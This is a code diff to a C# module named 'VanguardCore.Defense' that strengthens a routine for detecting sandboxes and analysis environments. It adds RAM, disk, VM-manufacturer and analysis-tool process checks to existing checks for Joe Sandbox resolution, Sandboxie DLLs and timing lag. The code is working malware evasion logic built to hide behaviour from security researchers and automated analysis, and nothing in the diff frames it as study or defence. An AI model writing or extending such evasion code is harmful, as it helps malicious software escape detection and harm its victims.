@@ -6,6 +6,7 @@ using System.Net;
 using System.Net.Http;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Management;
 
 namespace VanguardCore.Defense
 {
@@ -19,37 +20,60 @@ namespace VanguardCore.Defense
 
         public static bool CheckAll()
         {
-            // 1. CPU Core Count Check (Sandboxes < 4)
-            if (Environment.ProcessorCount < 4) return true;
+            // 1. CPU Core Count Check (Sandboxes < 2)
+            if (Environment.ProcessorCount < 2) return true;
 
-            // 2. Resolution Check (Joe Sandbox: 1920x1017)
+            // 2. RAM Check (Sandboxes < 3GB)
+            try {
+                long ramBytes = 0;
+                using (var searcher = new ManagementObjectSearcher("Select TotalPhysicalMemory from Win32_ComputerSystem")) {
+                    foreach (var item in searcher.Get()) {
+                        ramBytes = Convert.ToInt64(item["TotalPhysicalMemory"]);
+                        break;
+                    }
+                }
+                if (ramBytes > 0 && ramBytes < 3L * 1024 * 1024 * 1024) return true;
+            } catch { }
+
+            // 3. Disk Size Check (Sandboxes < 60GB)
+            try {
+                string sysDrive = Path.GetPathRoot(Environment.SystemDirectory);
+                DriveInfo drive = new DriveInfo(sysDrive);
+                if (drive.TotalSize < 60L * 1024 * 1024 * 1024) return true;
+            } catch { }
+
+            // 4. VM Hardware Check (Manufacturers)
+            try {
+                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem")) {
+                    foreach (var item in searcher.Get()) {
+                        string m = item["Manufacturer"].ToString().ToLower();
+                        string mod = item["Model"].ToString().ToLower();
+                        if (m.Contains("microsoft") && mod.Contains("virtual")) return true; // Hyper-V
+                        if (m.Contains("vmware") || mod.Contains("vmware")) return true;
+                        if (m.Contains("innotek") || mod.Contains("virtualbox")) return true;
+                    }
+                }
+            } catch { }
+
+            // 5. Resolution Check (Joe Sandbox: 1920x1017)
             int width = GetSystemMetrics(SM_CXSCREEN);
             int height = GetSystemMetrics(SM_CYSCREEN);
             if (width == 1920 && height == 1017) return true;
-            if (width < 800 || height < 600) return true; // Minimal resolution often seen in old VMs
+            if (width < 800 || height < 600) return true;
 
-            // 3. Arsenal Image Mounter (Cuckoo)
-            string systemDir = Environment.SystemDirectory;
-            if (File.Exists(Path.Combine(systemDir, "drivers\\aimbus.sys")) || 
-                File.Exists(Path.Combine(systemDir, "drivers\\aimdisk.sys"))) return true;
+            // 6. Blacklisted DLLs & Software
+            string[] badDlls = { "SbieDll.dll", "api_log.dll", "dir_log.dll", "dbghelp.dll", "vmcheck.dll", "wship6.dll" };
+            foreach (var dll in badDlls) if (GetModuleHandle(dll) != IntPtr.Zero) return true;
 
-            // 4. Blacklisted DLLs (Sandboxie, API Logs, etc.)
-            string[] badDlls = { "SbieDll.dll", "api_log.dll", "dir_log.dll", "dbghelp.dll", "pstorec.dll", "vmcheck.dll", "wship6.dll", "cmdvnsmi.dll" };
-            foreach (var dll in badDlls)
-            {
-                if (GetModuleHandle(dll) != IntPtr.Zero) return true;
-            }
+            // 7. Analysis Tool Check (Active Processes)
+            string[] tools = { "wireshark", "x64dbg", "processhacker", "glasswire", "dnspy" };
+            foreach (var tool in tools) if (Process.GetProcessesByName(tool).Length > 0) return true;
 
-            // 5. Wallace / Any.Run Detection
-            string[] anyRunUsers = { "admin", "lucas", "johnson", "vboxguest" };
-            string currentUser = Environment.UserName.ToLower();
-            if (anyRunUsers.Contains(currentUser)) return true;
-
-            // 6. API Latency Check (Detects heavy instrumentation)
+            // 8. API Latency Check
             long t1 = GetTickCount64();
             Thread.Sleep(10);
             long t2 = GetTickCount64();
-            if (t2 - t1 > 500) return true; // Extreme lag during sleep usually means hypervisor hooking
+            if (t2 - t1 > 500) return true;
 
             return false;
         }
